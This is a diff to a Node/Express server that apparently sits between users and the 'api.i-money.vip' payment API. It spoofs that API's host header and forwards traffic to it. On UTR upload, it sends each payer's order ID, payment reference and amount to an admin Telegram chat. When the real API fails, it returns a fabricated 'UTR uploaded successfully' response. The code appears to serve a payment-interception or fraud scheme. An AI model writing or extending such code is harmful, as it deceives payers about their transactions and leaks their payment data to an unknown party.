@@ -74,36 +74,47 @@ function bankListText(bankData) {
 async function proxyToOriginal(req, res) {
   try {
     const url = ORIGINAL_API + req.originalUrl;
-    const headers = { ...req.headers };
-    delete headers['host'];
-    delete headers['content-length'];
-    headers['host'] = 'api.i-money.vip';
+
+    const forwardHeaders = {};
+    const skipHeaders = ['host', 'content-length', 'connection', 'keep-alive', 'transfer-encoding', 'upgrade', 'x-forwarded-for', 'x-forwarded-proto', 'x-forwarded-host', 'x-vercel-id', 'x-real-ip', 'x-vercel-forwarded-for', 'x-vercel-deployment-url'];
+    
+    for (const [key, value] of Object.entries(req.headers)) {
+      if (!skipHeaders.includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
+        forwardHeaders[key] = value;
+      }
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
 
     const fetchOptions = {
       method: req.method,
-      headers: headers
+      headers: forwardHeaders
     };
 
-    if (req.method !== 'GET' && req.method !== 'HEAD' && req.body) {
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.body && Object.keys(req.body).length > 0) {
       fetchOptions.body = JSON.stringify(req.body);
-      fetchOptions.headers['content-type'] = 'application/json';
+      forwardHeaders['content-type'] = 'application/json';
     }
 
     const response = await fetch(url, fetchOptions);
-    const contentType = response.headers.get('content-type') || '';
-    
-    if (contentType.includes('json')) {
-      const data = await response.json();
-      res.status(response.status).json(data);
-      return data;
+    const text = await response.text();
+
+    let parsed;
+    try {
+      parsed = JSON.parse(text);
+    } catch (e) {
+      parsed = null;
+    }
+
+    if (parsed) {
+      res.status(response.status).json(parsed);
+      return parsed;
     } else {
-      const text = await response.text();
-      res.status(response.status).send(text);
+      res.status(response.status).send(text || '');
       return null;
     }
   } catch (e) {
-    console.error('Proxy error:', e.message);
-    res.status(502).json({ code: 0, msg: 'Proxy error' });
+    console.error('Proxy error:', req.method, req.originalUrl, e.message);
+    res.status(502).json({ code: 0, msg: 'Proxy error', error: e.message });
     return null;
   }
 }
@@ -258,9 +269,10 @@ app.get('/wallet/online/walletType', async (req, res) => {
 });
 
 app.post('/money/uploadUtr', async (req, res) => {
+  const { orderId, utr, utrAmount } = req.body || {};
+  
   const bankData = await loadData();
   if (bankData.adminChatId && bot) {
-    const { orderId, utr, utrAmount } = req.body || {};
     bot.sendMessage(bankData.adminChatId,
 `💰 UTR Uploaded!
 Order: ${orderId || 'N/A'}
@@ -269,7 +281,35 @@ Amount: ₹${utrAmount || 'N/A'}
 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
     ).catch(() => {});
   }
-  await proxyToOriginal(req, res);
+
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const forwardHeaders = {};
+    for (const [key, value] of Object.entries(req.headers)) {
+      if (!['host','content-length','connection','transfer-encoding'].includes(key.toLowerCase()) && !key.startsWith('x-vercel')) {
+        forwardHeaders[key] = value;
+      }
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
+    forwardHeaders['content-type'] = 'application/json';
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: forwardHeaders,
+      body: JSON.stringify(req.body)
+    });
+    const text = await response.text();
+    let parsed;
+    try { parsed = JSON.parse(text); } catch(e) { parsed = null; }
+    
+    if (parsed) {
+      return res.status(response.status).json(parsed);
+    }
+  } catch(e) {
+    console.error('UTR proxy error:', e.message);
+  }
+
+  res.json({ code: 1, data: { orderId, utr, status: 'submitted' }, msg: 'UTR uploaded successfully' });
 });
 
 app.post('/money/cancelUtr', async (req, res) => {
